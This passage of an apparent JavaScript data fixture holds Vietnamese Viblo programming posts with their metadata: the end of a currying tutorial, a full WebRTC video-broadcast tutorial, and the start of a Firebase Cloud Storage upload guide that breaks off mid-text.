lu\u00f4n c\u1ea3 ngo\u1eb7c `{}` \u0111\u1ec3 c\u00f3 th\u1ec3 vi\u1ebft g\u1ecdn th\u00e0nh 1 d\u00f2ng. C\u00e1ch return nh\u01b0 th\u1ebf n\u00e0y \u0111\u01b0\u1ee3c g\u1ecdi l\u00e0 implicity return.\n<br>\n\nV\u1eady, l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 g\u1ecdi h\u00e0m tr\u00ean?\n```javascript\n// G\u1ecdi h\u00e0m \u0111\u01b0\u1ee3c vi\u1ebft theo c\u00e1ch \"b\u00ecnh th\u01b0\u1eddng\"\nadd(1, 2) // 3\n\n// G\u1ecdi h\u00e0m vi\u1ebft theo ki\u1ec3u curried (b\u1ea5t k\u1ec3 v\u1edbi syntax ES5 hay ES6)\nadd(1)(2) // 3\n```\n\nM\u1ed9t s\u1ed1 ng\u01b0\u1eddi s\u1ebd cho r\u1eb1ng c\u00e1ch g\u1ecdi c\u1ee7a curried function \"x\u1ea5u\" h\u01a1n v\u00ec c\u00f3 nhi\u1ec1u d\u1ea5u ngo\u1eb7c \u0111\u01a1n. Nh\u01b0ng r\u1ed3i b\u1ea1n s\u1ebd quen v\u1edbi n\u00f3. H\u01a1n n\u1eefa, khi ch\u00fang ta t\u00ecm hi\u1ec3u s\u00e2u th\u00eam v\u1ec1 Functional Programming, b\u1ea1n s\u1ebd b\u1eaft \u0111\u1ea7u th\u1ea5y \u0111\u01b0\u1ee3c nh\u1eefng l\u1ee3i \u00edch to l\u1edbn c\u1ee7a vi\u1ec7c vi\u1ebft curried function.\n\n# Partial application\nV\u1eady th\u00ec, c\u00e1ch vi\u1ebft nh\u01b0 th\u1ebf n\u00e0y s\u1ebd b\u1ed5 sung cho ch\u00fang ta th\u00eam \u0111i\u1ec1u g\u00ec? Gi\u1ea3 s\u1eed b\u1ea1n th\u01b0\u1eddng xuy\u00ean c\u1ea7n ph\u1ea3i c\u1ed9ng m\u1ed9t s\u1ed1 v\u1edbi 2. B\u1ea1n c\u00f3 th\u1ec3 t\u1ea1o m\u1ed9t h\u00e0m m\u1edbi ch\u1ec9 \u0111\u1ec3 th\u1ef1c hi\u1ec7n \u0111i\u1ec1u \u0111\u00f3. M\u00ecnh bi\u1ebft v\u00ed d\u1ee5 n\u00e0y kh\u00e1 v\u00f4 d\u1ee5ng, nh\u01b0ng do ch\u1ec9 l\u00e0 v\u00ed d\u1ee5 n\u00ean m\u00ecnh ch\u1ec9 l\u00e0m \u0111\u01a1n gi\u1ea3n nh\u01b0 v\u1eady (tuy nhi\u00ean m\u00ecnh ngh\u0129 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 h\u00ecnh dung ra, v\u1edbi m\u1ed9t h\u00e0m b\u00e0n \u0111\u1ea7u c\u00f3 nhi\u1ec1u logic th\u00ec vi\u1ec7c s\u1eed d\u1ee5ng currying \u0111\u1ec3 s\u1eed d\u1ee5ng ch\u1ec9 m\u1ed9t ph\u1ea7n logic c\u1ee7a n\u00f3 l\u00e0 r\u1ea5t h\u1eefu \u00edch).\n```javascript\n// T\u1ea1o m\u1ed9t h\u00e0m m\u1edbi\nconst add2 = add(2);\n\nadd2(1) // 3\nadd2(8) // 10\n```\n\nK\u1ef9 thu\u1eadt n\u00e0y \u0111\u01b0\u1ee3c g\u1ecdi l\u00e0 \u00e1p d\u1ee5ng m\u1ed9t ph\u1ea7n (Partial application) v\u00ec ch\u00fang ta kh\u00f4ng \u00e1p d\u1ee5ng ho\u00e0n to\u00e0n h\u00e0m ban \u0111\u1ea7u. Ch\u00fang ta g\u1ecdi n\u00f3 v\u1edbi \u0111\u1ed1i s\u1ed1 \u0111\u1ea7u ti\u00ean \u0111\u1ec3 tr\u1ea3 v\u1ec1 h\u00e0m b\u00ean trong (m\u00e0 kh\u00f4ng c\u00f3 \u0111\u1ed1i s\u1ed1 c\u1ee7a n\u00f3). H\u00e0m b\u00ean trong s\u1ebd c\u00f3 quy\u1ec1n truy c\u1eadp v\u00e0o \u0111\u1ed1i s\u1ed1 c\u1ee7a h\u00e0m b\u00ean ngo\u00e0i nh\u1edd closure.\n<br>\n\n\u0110\u1ec3 l\u00e0m r\u00f5 h\u01a1n, h\u00e3y \u0111\u1ec3 m\u00ecnh th\u1ec3 hi\u1ec7n cho b\u1ea1n d\u01b0\u1edbi m\u1ed9t c\u00e1ch kh\u00e1c khi ch\u00fang ta g\u1ecdi ta `add(2)`.\n```javascript\n// m\u1ed9t bi\u1ebfn 'a' \u0111\u01b0\u1ee3c g\u00e1n gi\u00e1 tr\u1ecb 2,\n// h\u00e0m b\u00ean trong c\u00f3 th\u1ec3 truy c\u1eadp n\u00f3.\nconst a = 2;\n\n//'add2' \u0111\u01b0\u1ee3c g\u00e1n gi\u00e1 tr\u1ecb l\u00e0 h\u00e0m b\u00ean trong\nconst add2 = function (b) {\n    return a + b;\n}\n```\n\n-----\n\nHy v\u1ecdng r\u1eb1ng b\u00e2y gi\u1edd c\u00e1c b\u1ea1n \u0111\u00e3 hi\u1ec3u m\u1ed9t c\u00e1ch c\u01a1 b\u1ea3n currying ngh\u0129a l\u00e0 g\u00ec. Trong b\u00e0i vi\u1ebft ti\u1ebfp theo, ch\u00fang ta s\u1ebd \u00e1p d\u1ee5ng nhi\u1ec1u h\u01a1n k\u0129 thu\u1eadt n\u00e0y khi ch\u00fang ta t\u00ecm hi\u1ec3u v\u1ec1 [compose](). B\u00e0i vi\u1ebft ti\u1ebfp theo ch\u1eafc h\u1ea3n s\u1ebd r\u1ea5t th\u00fa v\u1ecb, v\u00ec theo m\u00ecnh, \u0111\u00e2y l\u00e0 m\u1ed9t trong nh\u1eefng th\u1ee7 thu\u1eadt hay v\u00e0 h\u1eefu \u00edch nh\u1ea5t trong Functional programming. H\u1eb9n g\u1eb7p l\u1ea1i c\u00e1c b\u1ea1n!\n\n-----\n\n*Source: https://levelup.gitconnected.com/functional-programming-for-javascript-developers-currying-2d16766909e9*",
      published_at: "2021-02-21 18:46:59",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-17 18:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 0,
      views_count: 86,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 25988,
          url: "https://viblo.asia/u/nguyentung",
          avatar: "fd1928ae-6282-41b4-b4f0-b3b5a89226c5.png",
          name: "T\u00f9ng",
          username: "nguyentung",
          followers_count: 11,
          reputation: 300,
          posts_count: 25,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "currying",
            name: "currying",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=currying&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "functional-programming",
            name: "Functional Programming",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Functional+Programming&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51582,
      title: "Building a WebRTC video broadcast using Javascript (P2)",
      slug: "Ljy5VjPM5ra",
      url:
        "https://viblo.asia/p/building-a-webrtc-video-broadcast-using-javascript-p2-Ljy5VjPM5ra",
      user_id: 46138,
      moderation: null,
      transliterated: "building-a-webrtc-video-broadcast-using-javascript-p2",
      contents_short:
        "Xin ch\u00e0o c\u00e1c b\u1ea1n l\u1ea1i l\u00e0 t\u00f4i \u0111\u00e2y . \u1ede b\u00e0i tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 tri\u1ec3n khai Socket.io tr\u00ean server. B\u00e2y gi\u1edd ch\u00fang ta s\u1ebd ti\u1ebfp t\u1ee5c v\u1edbi vi\u1ec7c tri\u00ean khai c\u00e1c k\u1ebft n\u1ed1i d\u01b0\u1edbi client\nLayouts\nLayouts c\u1ee7a ch\u00fang ta bao...",
      contents:
        'Xin ch\u00e0o c\u00e1c b\u1ea1n l\u1ea1i l\u00e0 t\u00f4i \u0111\u00e2y . \u1ede b\u00e0i tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 tri\u1ec3n khai Socket.io tr\u00ean server. B\u00e2y gi\u1edd ch\u00fang ta s\u1ebd ti\u1ebfp t\u1ee5c v\u1edbi vi\u1ec7c tri\u00ean khai c\u00e1c k\u1ebft n\u1ed1i d\u01b0\u1edbi client\n# Layouts\nLayouts c\u1ee7a ch\u00fang ta bao g\u1ed3m hai t\u1ec7p HTML c\u01a1 b\u1ea3n ch\u1ee9a ch\u1ebf \u0111\u1ed9 xem video m\u00e0 sau n\u00e0y s\u1ebd hi\u1ec3n th\u1ecb lu\u1ed3ng video m\u00e0 ch\u00fang ta \u0111ang g\u1eedi v\u00e0 t\u1ec7p CSS cho m\u1ed9t s\u1ed1 ki\u1ec3u c\u01a1 b\u1ea3n.\n\nT\u1ec7p index.html ch\u1ee9a m\u1ed9t ch\u1ebf \u0111\u1ed9 xem video s\u1ebd hi\u1ec3n th\u1ecb lu\u1ed3ng video t\u1eeb  broadcaster . Import th\u01b0 vi\u1ec7n socket.io v\u00e0 `watch.js`\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Viewer</title>\n\t<meta charset="UTF-8" />\n\t<link href="/styles.css" rel="stylesheet">\n</head>\n<body>\n<video playsinline autoplay></video>\n<script src="/socket.io/socket.io.js"></script>\n<script src="/watch.js"></script>\n</body>\n</html>\n```\n\n \u1ede broadcast.html file ch\u00fang ta s\u1ebb c\u1ea5u h\u00ecnh nh\u01b0 tr\u00ean v\u00e0 thay  watch.js b\u0103ng broadcast.js\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Broadcaster</title>\n  <meta charset="UTF-8" />\n  <link href="/styles.css" rel="stylesheet">\n</head>\n<body>\n<video playsinline autoplay muted></video>\n<script src="/socket.io/socket.io.js"></script>\n<script src="/broadcast.js"></script>\n</body>\n</html>\n```\n\nCh\u00fang ta s\u1ebb css \u0111\u01a1n gian cho n\u00f3\n\n```css\nhtml {\n  overflow: hidden;\n  height: 100%;\n}\n\nvideo {\n  width: 100%;\n  height: 100%;\n  position: absolute;\n  display: block;\n  top: 0;\n  left: 0;\n  object-fit: cover;\n}\n\nbody {\n  background-color: black;\n  margin: 0;\n  height: 100%;\n  width: 100%;\n  position: fixed;\n  top: 0;\n  left: 0;\n  bottom: 0;\n  right: 0;\n}\nRT\n```\n# RTCPeerConnection\n\n`RTCPeerConnections` gi\u00fap ch\u00fang ta k\u1ebft n\u1ed1i hai m\u00e1y t\u00ednh n\u1eb1m trong m\u1ea1ng c\u1ee5c b\u1ed9 v\u1edbi nhau. \n\nTrong h\u01b0\u1edbng d\u1eabn n\u00e0y, ch\u00fang ta c\u00f3 hai ph\u1ea7n kh\u00e1c nhau c\u1ee7a k\u1ebft n\u1ed1i. M\u1ed9t l\u00e0 `broadcaster`  c\u00f3 th\u1ec3 c\u00f3 nhi\u1ec1u k\u1ebft n\u1ed1i `peer-to-peer` v\u1edbi `client`  v\u00e0 g\u1eedi video b\u1eb1ng `stream` . C\u00e1i th\u1ee9 hai l\u00e0 m\u00e1y `client` ch\u1ec9 c\u00f3 m\u1ed9t k\u1ebft n\u1ed1i v\u1edbi \u0111\u00e0i `broadcaster` hi\u1ec7n t\u1ea1i.\n\n# Broadcaster\n\u0110\u1ea7u ti\u00ean, ch\u00fang t\u00f4i t\u1ea1o c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng c\u1ea5u h\u00ecnh cho k\u1ebft n\u1ed1i `peer-to-peer` v\u00e0 m\u00e1y \u1ea3nh. \n\n```js\nconst peerConnections = {};\nconst config = {\n  iceServers: [\n    {\n      urls: ["stun:stun.l.google.com:19302"]\n    }\n  ]\n};\n\nconst socket = io.connect(window.location.origin);\nconst video = document.querySelector("video");\n\nconst constraints = {\n  video: { facingMode: "user" }\n  // audio: true,\n};\n```\n\n\nCh\u00fang ta s\u1eed d\u1ee5ng m\u00e1y ch\u1ee7 google  ch\u00ednh th\u1ee9c cho k\u1ebft n\u1ed1i `peer-to-peer` v\u00e0  c\u1ea5u h\u00ecnh m\u00e1y \u1ea3nh c\u1ee7a ch\u00fang ta b\u1eb1ng m\u1ed9t s\u1ed1 thu\u1ed9c t\u00ednh. B\u1ea1n c\u0169ng c\u00f3 th\u1ec3 b\u1eadt \u00e2m thanh b\u1eb1ng c\u00e1ch b\u1ecf b\u1ecf comment \u1edf tr\u00ean.\n\nTr\u01b0\u1edbc khi t\u1ea1o k\u1ebft n\u1ed1i `peer-to-peer`, tr\u01b0\u1edbc ti\u00ean, ch\u00fang ta c\u1ea7n l\u1ea5y video t\u1eeb m\u00e1y \u1ea3nh \u0111\u1ec3 c\u00f3 th\u1ec3 th\u00eam n\u00f3 v\u00e0o k\u1ebft n\u1ed1i c\u1ee7a m\u00ecnh. \n\n```js\nnavigator.mediaDevices\n  .getUserMedia(constraints)\n  .then(stream => {\n    video.srcObject = stream;\n    socket.emit("broadcaster");\n  })\n  .catch(error => console.error(error));\n```\nTi\u1ebfp theo, ch\u00fang t\u00f4i s\u1ebd t\u1ea1o m\u1ed9t `RTCPeerConnection` b\u1eb1ng \u0111o\u1ea1n m\u00e3 sau:\n\n```js\nsocket.on("watcher", id => {\n  const peerConnection = new RTCPeerConnection(config);\n  peerConnections[id] = peerConnection;\n\n  let stream = video.srcObject;\n  stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));\n    \n  peerConnection.onicecandidate = event => {\n    if (event.candidate) {\n      socket.emit("candidate", id, event.candidate);\n    }\n  };\n\n  peerConnection\n    .createOffer()\n    .then(sdp => peerConnection.setLocalDescription(sdp))\n    .then(() => {\n      socket.emit("offer", id, peerConnection.localDescription);\n    });\n});\n\nsocket.on("answer", (id, description) => {\n  peerConnections[id].setRemoteDescription(description);\n});\n\nsocket.on("candidate", (id, candidate) => {\n  peerConnections[id].addIceCandidate(new RTCIceCandidate(candidate));\n});\n```\n\nCh\u00fang ta t\u1ea1o m\u1ed9t `RTCPeerConnection` m\u1edbi m\u1ed7i khi m\u1ed9t `client` m\u1edbi tham gia v\u00e0 l\u01b0u n\u00f3 trong \u0111\u1ed1i t\u01b0\u1ee3ng `peerConnections` c\u1ee7a ch\u00fang ta.\n\nSau \u0111\u00f3, ch\u00fang ta th\u00eam lu\u1ed3ng c\u1ee5c b\u1ed9 v\u00e0o k\u1ebft n\u1ed1i b\u1eb1ng ph\u01b0\u01a1ng th\u1ee9c addTrack ().\n\nS\u1ef1 ki\u1ec7n `peerConnection.onicecandidate` \u0111\u01b0\u1ee3c g\u1ecdi khi ch\u00fang ta nh\u1eadn \u0111\u01b0\u1ee3c m\u1ed9t client v\u00e0 ch\u00fang t\u00f4i g\u1eedi n\u00f3 \u0111\u1ebfn `server` .\n\nSau \u0111\u00f3, ch\u00fang ta g\u1eedi m\u1ed9t \u0111\u1ec1 ngh\u1ecb k\u1ebft n\u1ed1i \u0111\u1ebfn m\u00e1y kh\u00e1ch b\u1eb1ng c\u00e1ch g\u1ecdi `peerConnection.createOffer()` v\u00e0 ch\u00fang ta g\u1ecdi `peerConnection.setLocalDescription()` \u0111\u1ec3 \u0111\u1ecbnh c\u1ea5u h\u00ecnh k\u1ebft n\u1ed1i.\n\n\u0110\u00f3ng k\u1ebft n\u1ed1i `client` ng\u1eaft k\u1ebft n\u1ed1i l\u00e0 m\u1ed9t ph\u1ea7n quan tr\u1ecdng kh\u00e1c c\u1ee7a \u1ee9ng d\u1ee5ng v\u00e0 ch\u00fang ta c\u00f3 th\u1ec3 l\u00e0m nh\u01b0 v\u1eady b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng m\u00e3 sau:\n\n```js\nsocket.on("disconnectPeer", id => {\n  peerConnections[id].close();\n  delete peerConnections[id];\n});\n```\nCu\u1ed1i c\u00f9ng, ch\u00fang ta s\u1ebd \u0111\u00f3ng k\u1ebft n\u1ed1i socket n\u1ebfu `client` \u0111\u00f3ng c\u1eeda s\u1ed5.\n\n```js\nwindow.onunload = window.onbeforeunload = () => {\n  socket.close();\n};\n```\n# Watcher (Client)\n`Watcher` c\u00f3 kh\u00e1 nhi\u1ec1u ch\u1ee9c n\u0103ng t\u01b0\u01a1ng t\u1ef1. S\u1ef1 kh\u00e1c bi\u1ec7t duy nh\u1ea5t l\u00e0  ch\u1ec9 m\u1edf m\u1ed9t k\u1ebft n\u1ed1i ngang h\u00e0ng v\u1edbi \u0111\u00e0i `broadcaster ` hi\u1ec7n t\u1ea1i v\u00e0  nh\u1eadn video thay v\u00ec ph\u00e1t tr\u1ef1c tuy\u1ebfn.\n\nCh\u00fang ta c\u0169ng c\u1ea7n t\u1ea1o c\u1ea5u h\u00ecnh cho `RTCPeerConnection` c\u1ee7a m\u00ecnh.\n\n```js\nlet peerConnection;\nconst config = {\n  iceServers: [\n    {\n      urls: ["stun:stun.l.google.com:19302"]\n    }\n  ]\n};\n\nconst socket = io.connect(window.location.origin);\nconst video = document.querySelector("video");\n```\n\nSau \u0111\u00f3, ch\u00fang ta c\u00f3 th\u1ec3 t\u1ea1o `RTCPeerConnection` c\u1ee7a m\u00ecnh v\u00e0 nh\u1eadn lu\u1ed3ng video t\u1eeb `broadcaster`. \n\n```js\nsocket.on("offer", (id, description) => {\n  peerConnection = new RTCPeerConnection(config);\n  peerConnection\n    .setRemoteDescription(description)\n    .then(() => peerConnection.createAnswer())\n    .then(sdp => peerConnection.setLocalDescription(sdp))\n    .then(() => {\n      socket.emit("answer", id, peerConnection.localDescription);\n    });\n  peerConnection.ontrack = event => {\n    video.srcObject = event.streams[0];\n  };\n  peerConnection.onicecandidate = event => {\n    if (event.candidate) {\n      socket.emit("candidate", id, event.candidate);\n    }\n  };\n});\n```\n\nSau khi k\u1ebft n\u1ed1i \u0111\u01b0\u1ee3c thi\u1ebft l\u1eadp, ch\u00fang ta c\u00f3 th\u1ec3 ti\u1ebfp t\u1ee5c b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng lu\u1ed3ng video b\u1eb1ng  `ontrack` c\u1ee7a \u0111\u1ed1i t\u01b0\u1ee3ng `peerConnection`.\n\nCh\u00fang ta c\u0169ng c\u1ea7n tri\u1ec3n khai c\u00e1c ch\u1ee9c n\u0103ng v\u00f2ng \u0111\u1eddi kh\u00e1c cho k\u1ebft n\u1ed1i ngang h\u00e0ng c\u1ee7a ch\u00fang ta \u0111\u1ec3 gi\u00fap ch\u00fang ta m\u1edf v\u00e0 \u0111\u00f3ng c\u00e1c k\u1ebft n\u1ed1i m\u1edbi.\n\n```js\nsocket.on("candidate", (id, candidate) => {\n  peerConnection\n    .addIceCandidate(new RTCIceCandidate(candidate))\n    .catch(e => console.error(e));\n});\n\nsocket.on("connect", () => {\n  socket.emit("watcher");\n});\n\nsocket.on("broadcaster", () => {\n  socket.emit("watcher");\n});\n\nwindow.onunload = window.onbeforeunload = () => {\n  socket.close();\n  peerConnection.close();\n};\n```\n\n# L\u1eddi k\u1ebft\nT\u1ea1i th\u1eddi \u0111i\u1ec3m n\u00e0y, \u1ee9ng d\u1ee5ng \u0111\u00e3 ho\u00e0n t\u1ea5t v\u00e0 b\u1ea1n c\u00f3 th\u1ec3 ti\u1ebfp t\u1ee5c th\u1eed nghi\u1ec7m n\u00f3 tr\u00ean tr\u00ecnh duy\u1ec7t c\u1ee7a m\u00ecnh.\n`"Th\u00e2n \u00e1i ch\u00e0o t\u1ea1m bi\u1ec7t"`\n\n# T\u00e0i Li\u1ec7u Tham Kh\u1ea3o\n- https://gabrieltanner.org/blog/webrtc-video-broadcast\n- https://webrtc.org/\n- https://developer.okta.com/blog/2020/10/21/webrtc-videochat-javascript',
      published_at: "2021-03-20 08:38:33",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:18:08",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 0,
      views_count: 10,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 46138,
          url: "https://viblo.asia/u/nguyenngoctrong",
          avatar: "18d8bd34-6154-4d68-ae38-836bf1535217.jpg",
          name: "Trong Nguyen Ngoc",
          username: "nguyenngoctrong",
          followers_count: 3,
          reputation: 109,
          posts_count: 7,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascrip",
            name: "Javascrip",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Javascrip&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "webrtc",
            name: "webrtc",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=webrtc&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50208,
      title:
        "Upload files l\u00ean Firebase Cloud Storage v\u1edbi Vue.js v\u00e0 Node.js",
      slug: "bJzKmaNBK9N",
      url:
        "https://viblo.asia/p/upload-files-len-firebase-cloud-storage-voi-vuejs-va-nodejs-bJzKmaNBK9N",
      user_id: 23490,
      moderation: null,
      transliterated:
        "upload-files-len-firebase-cloud-storage-voi-vuejs-va-nodejs",
      contents_short:
        "File uploads l\u00e0 m\u1ed9t ph\u1ea7n quan tr\u1ecdng trong \u1ee9ng d\u1ee5ng web ng\u00e0y n\u00e0y. Trong b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta s\u1ebd c\u00f9ng nhau x\u00e2y d\u1ef1ng m\u1ed9t function upload file nho nh\u1ecf v\u00e0 \u0111\u1ea9y l\u00ean Firebase Cloud Storage v\u1edbi s\u1ef1 k\u1ebft h\u1ee3p...",
      contents:
        "File uploads l\u00e0 m\u1ed9t ph\u1ea7n quan tr\u1ecdng trong \u1ee9ng d\u1ee5ng web ng\u00e0y n\u00e0y. Trong b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta s\u1ebd c\u00f9ng nhau x\u00e2y d\u1ef1ng m\u1ed9t function upload file nho nh\u1ecf v\u00e0 \u0111\u1ea9y l\u00ean **Firebase Cloud Storage** v\u1edbi s\u1ef1 k\u1ebft h\u1ee3p gi\u1eefa Vue v\u00e0 Node.js.\n\n## Set up Firebase project\n\u0110\u1ea7u ti\u00ean, ch\u00fang ta c\u1ea7n c\u00f3 m\u1ed9t t\u00e0i kho\u1ea3n firebase (ch\u00fang ta c\u00f3 th\u1ec3 \u0111\u0103ng k\u00fd [t\u1ea1i \u0111\u00e2y](https://firebase.google.com/)). Truy c\u1eadp https://console.firebase.google.com/ v\u00e0 t\u1ea1o m\u1ed9t project m\u1edbi. Ch\u1ecdn **Storage** v\u00e0 l\u1ef1a ch\u1ecdn location \u0111\u1ec3 t\u1ea1o bucket m\u1eb7c \u0111\u1ecbnh.\n\nB\u00e2y gi\u1edd, ch\u00fang ta c\u1ea7n k\u1ebft n\u1ed1i v\u1edbi bucket b\u1eb1ng c\u00e1ch t\u1ea1o ra m\u1ed9t private key \u0111\u1ec3 b\u1ea3o v\u1ec7 k\u1ebft n\u1ed1i. Trong project settings, click v\u00e0o tab Service Accounts v\u00e0 click n\u00fat \"Generate private key\". Sau \u0111\u00f3 Firebase s\u1ebd sinh ra m\u1ed9t JSON file bao g\u1ed3m credentials c\u1ee7a t\u00e0i kho\u1ea3n firebase.\n\n## Node.js API\n### Init node.js api\n\u0110\u1ec3 upload files ch\u00fang ta s\u1ebd s\u1eed d\u1ee5ng package [**multer**](https://www.npmjs.com/package/multer) v\u00e0 **firebase-admin**.\n\n```JS\nnpm i express multer firebase-admin\n```\n\nTi\u1ebfp theo ch\u00fang ta c\u1ea7n t\u1ea1o m\u1ed9t index.js webserver v\u00e0 import c\u00e1c dependencies. \n\n```JS\nconst express = require('express')\nconst multer = require('multer')\nconst app = express()\napp.use(express.urlencoded({extended: false}))\napp.use(express.json({extended: false}))\napp.post('/upload', (req, res) => {\n    console.log(\"File upload API\")\n})\n\napp.listen(3001, () => {\n    console.log('\ud83d\ude80Server listening on port 3001')\n})\n```\n\nCh\u00fang ta x\u00e2y d\u1ef1ng file upload API s\u1eed d\u1ee5ng multer cho vi\u1ec7c upload file. Multer cung c\u1ea5p `req.file` object bao g\u1ed3m th\u00f4ng tin files v\u00e0 `req.body` bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng d\u1eef li\u1ec7u. Ch\u00fang ta s\u1ebd s\u1eed d\u1ee5ng `MemoryStorage` \u0111\u01b0\u1ee3c cung c\u1ea5p b\u1edfi multer.  \n\n```JS\nconst upload = multer({\n    storage: multer.memoryStorage()\n})\napp.use(upload.single())\n```\n\nB\u00e2y gi\u1edd ch\u00fang ta c\u00f3 th\u1ec3 truy c\u1eadp th\u00f4ng tin file v\u1edbi `req.file`. N\u1ebfu mu\u1ed1n upload multiple files s\u1eed d\u1ee5ng `upload.any()` thay th\u1ebf cho `upload.single()` v\u00e0 truy c\u1eadp th\u00f4ng tin file v\u1edbi `req.files`.\n\n`index.js` file:\n```JS\nconst express = require('express')\nconst multer = require('multer')\nconst app = express()\napp.use(express.urlencoded({extended: false}))\napp.use(express.json({extended: false}))\n\nconst upload = multer({\n    storage: multer.memoryStorage()\n})\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    console.log(\"File upload API\")\n}\n\napp.listen(3001, () => {\n    console.log('\ud83d\ude80Server listening on port 3001')\n})\n```\n### Connect to firebase\n\nCh\u00fang ta s\u1ebd c\u1ea7n k\u1ebft n\u1ed1i t\u1edbi Firebase b\u1eb1ng c\u00e1ch t\u1ea1o firebase.js \u0111\u1ec3 import firebase package v\u00e0 kh\u1edfi t\u1ea1o firebase admin SDK.\n\n**`firebase.js`**\n```JS\nconst admin = require('firebase-admin')\n\n// Initialize firebase admin SDK\nadmin.initializeApp({\n  credential: admin.credential.cert(<path to your firebase credentials file>),\n  storageBucket: <firebaseprojectid>.appspot.com\n})\n// Cloud storage\nconst bucket = admin.storage().bucket()\n\nmodule.exports = {\n  bucket\n}\n```\n### Upload files to firebase\n\nTi\u1ebfp theo, ch\u00fang ta c\u1ea7n import bucket `firebase.js` \u0111\u00e3 kh\u1edfi t\u1ea1o \u1edf tr\u00ean v\u00e0o `index.js`.\n```JS\nconst firebase = require('./firebase')\n```\n\n\u0110\u1ea7u ti\u00ean khi th\u1ef1c hi\u1ec7n upload file, ch\u00fang ta c\u1ea7n ki\u1ec3m tra request th\u1ef1c s\u1ef1 t\u1ed3n t\u1ea1i file t\u1ea3i l\u00ean hay kh\u00f4ng. N\u1ebfu request kh\u00f4ng t\u1ed3n t\u1ea1i ch\u00fang ta s\u1ebd tr\u1ea3 v\u1ec1 m\u00e3 l\u1ed7i 400.\n```JS\nif(!req.file) {\n        res.status(400).send(\"Error: No files found\")\n}\n```\n\nFirebase s\u1eed d\u1ee5ng **blobs** \u0111\u1ec3 l\u01b0a tr\u1eef d\u1eef li\u1ec7u m\u00e3 nh\u1ecb ph\u00e2n (**binary data**). blobs hay Binary Large Objects, l\u00e0 m\u1ed9t t\u1eadp h\u1ee3p m\u00e3 nh\u1ecb ph\u00e2n \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef d\u01b0\u1edbi d\u1ea1ng m\u1ed9t th\u1ef1c th\u1ec3 (entity) trong database. Ch\u00fang ta c\u00f3 th\u1ec3 t\u1ea1o m\u1ed9t blob s\u1eed d\u1ee5ng bucket.file() v\u1edbi t\u00ean file upload.\n```JS\nconst blob = firebase.bucket.file(req.file.filename)\n```\n\nB\u00e2y gi\u1edd, ch\u00fang ta c\u1ea7n t\u1ea1o m\u1ed9t lu\u1ed3ng ghi d\u1eef li\u1ec7u (writable stream) tr\u1ef1c ti\u1ebfp \u0111\u1ec3 x\u1eed l\u00fd d\u1eef li\u1ec7u \u0111\u1ebfn. Streams v\u1ec1 c\u01a1 b\u1ea3n l\u00e0 t\u1eadp h\u1ee3p d\u1eef li\u1ec7u, nh\u01b0ng n\u00f3 kh\u00f4ng c\u00f3 s\u1eb5n c\u00f9ng m\u1ed9t l\u00fac m\u00e0 ch\u00fang ta c\u1ea7n x\u1eed l\u00fd t\u1eebng \u0111o\u1ea1n m\u1ed9t.\n\nCh\u00fang ta c\u1ea7n chuy\u1ec3n mimetype c\u1ee7a t\u1ec7p d\u01b0\u1edbi d\u1ea1ng metadata n\u1ebfu kh\u00f4ng ch\u00fang ta kh\u00f4ng th\u1ec3 \u0111\u1ecdc \u0111\u01b0\u1ee3c d\u1eef li\u1ec7u v\u1edbi \u0111\u1ecbnh d\u1ea1ng th\u00edch h\u1ee3p.\n\n```JS\ncosnt blobWriter = blob.createWriteStream({\n    metadata: {\n        contentType: req.file.mimetype\n    }\n})\n```\n\nCh\u00fang ta c\u1ea7n ki\u1ec3m tra l\u1ed7i trong khi t\u1ea1o lu\u1ed3ng ghi d\u1eef li\u1ec7u b\u1edbi s\u1ef1 ki\u1ec7n `error` trong 